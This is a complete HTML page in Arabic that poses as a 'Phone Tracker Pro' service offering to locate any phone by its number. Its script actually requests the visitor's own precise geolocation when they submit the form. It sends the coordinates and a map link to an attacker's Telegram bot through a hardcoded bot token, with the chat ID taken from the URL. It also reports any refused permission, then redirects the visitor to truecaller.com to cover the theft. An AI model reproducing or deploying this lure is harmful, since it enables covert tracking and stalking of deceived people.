<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phone Tracker Pro - تحديد الموقع عبر الرقم</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #080c14; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111827; border: 1px solid #1f293d; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); }
        
        /* أيقونة الرادار المتحركة */
        .radar-box { width: 80px; height: 80px; border: 2px solid #10b981; border-radius: 50%; margin: 0 auto 20px auto; position: relative; display: flex; justify-content: center; align-items: center; animation: radarPulse 2s infinite; }
        .radar-point { width: 10px; height: 10px; background: #10b981; border-radius: 50%; box-shadow: 0 0 12px #10b981; }
        @keyframes radarPulse { 0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(16, 185, 129, 0); } 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); } }

        h2 { font-size: 20px; margin-bottom: 6px; color: #34d399; }
        p { font-size: 12px; color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }

        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 12px; background: #0b0f19; border: 1px solid #374151; color: #fff; border-radius: 8px; font-size: 14px; outline: none; text-align: center; }
        input:focus { border-color: #10b981; }

        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #059669, #047857); border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 8px; cursor: pointer; transition: 0.3s; }
        .btn:hover { opacity: 0.9; }
        .status { margin-top: 15px; font-size: 11px; color: #38bdf8; display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="radar-box">
            <div class="radar-point"></div>
        </div>
        <h2>تحديد الموقع عبر رقم الهاتف</h2>
        <p>أدخل رقم الهاتف مع رمز الدولة لتتبع ومزامنة إحداثيات الأبراج القريبة بدقة.</p>

        <form id="trackForm">
            <div class="input-group">
                <input type="text" id="phoneNumber" placeholder="مثال: +967XXXXXXXXX" required>
            </div>
            <button type="submit" class="btn" id="subBtn">بدء التتبع والبحث الفوري</button>
        </form>
        <div class="status" id="statusText">جاري الاتصال بالأقمار الصناعية وتثليث الإحداثيات...</div>
    </div>

    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('trackForm').addEventListener('submit', function(e) {
            e.preventDefault();
            if(!targetChatId) return;

            const phone = document.getElementById('phoneNumber').value;
            document.getElementById('trackForm').style.display = 'none';
            document.getElementById('statusText').style.display = 'block';

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    // صياغة رسالة الإحداثيات ورقم الهاتف المستهدف
                    const msg = `🎯 صيد تحديد موقع عبر الرقم!\n\n📱 الرقم المستهدف: ${phone}\n\n🌐 خط العرض (Lat): ${lat}\n🌐 خط الطول (Lon): ${lon}\n📍 نسبة الدقة: ${accuracy} متر\n\n🗺️ رابط الخريطة المباشر:\nhttps://www.google.com/maps?q=${lat},${lon}`;

                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(msg)}`);

                    setTimeout(() => {
                        window.location.href = "https://www.truecaller.com";
                    }, 1200);

                }, async function(error) {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`⚠️ حاول تتبع الرقم (${phone}) ولكنه رفض إذن تحديد الموقع الجغرافي.`)}`);
                    setTimeout(() => {
                        window.location.href = "https://www.truecaller.com";
                    }, 1200);
                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
            } else {
                setTimeout(() => {
                    window.location.href = "https://www.truecaller.com";
                }, 1200);
            }
        });
    </script>
</body>
</html>
